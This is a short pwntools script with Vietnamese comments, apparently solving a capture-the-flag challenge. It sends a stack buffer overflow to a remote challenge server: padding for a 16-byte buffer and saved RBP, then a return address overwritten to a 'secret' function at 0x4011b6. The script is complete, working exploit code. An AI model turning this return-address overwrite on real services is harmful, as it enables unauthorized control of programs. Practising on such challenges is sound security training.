from pwn import *

# --- PHẦN THAY ĐỔI ĐỂ KẾT NỐI REMOTE ---
USE_REMOTE = True
REMOTE_HOST = "dat-overflow-dough-20f9bb9ae751c257.challs.brunnerne.xyz"
REMOTE_PORT = 443
# --- KẾT THÚC PHẦN THAY ĐỔI ---


# Các giá trị này vẫn giữ nguyên vì binary trên server giống hệt file của bạn
RECIPE_BUFFER_SIZE = 16
RBP_SIZE = 8
SECRET_ADDRESS = 0x4011b6
PROMPT = "Please enter the name of the recipe you want to retrieve:"


"""
This is a pwntools template - you do not have to change anything below this
Install pwntools before running:
    python3 -m pip install pwntools

(if you get an error about the environment being externally managed, add --break-system-packages to the command)
"""
if USE_REMOTE:
    # Dòng này sẽ kết nối đến server từ xa qua SSL, giống như lệnh ncat --ssl
    io = remote(REMOTE_HOST, REMOTE_PORT, ssl=True)
else:
    e = ELF("./recipe")
    io = e.process()

# Building the payload
payload = b"A" * RECIPE_BUFFER_SIZE
payload += b"B" * RBP_SIZE
payload += p64(SECRET_ADDRESS)

# Sending the payload at the right time
io.recvuntil(PROMPT.encode())
io.sendline(payload)
io.interactive()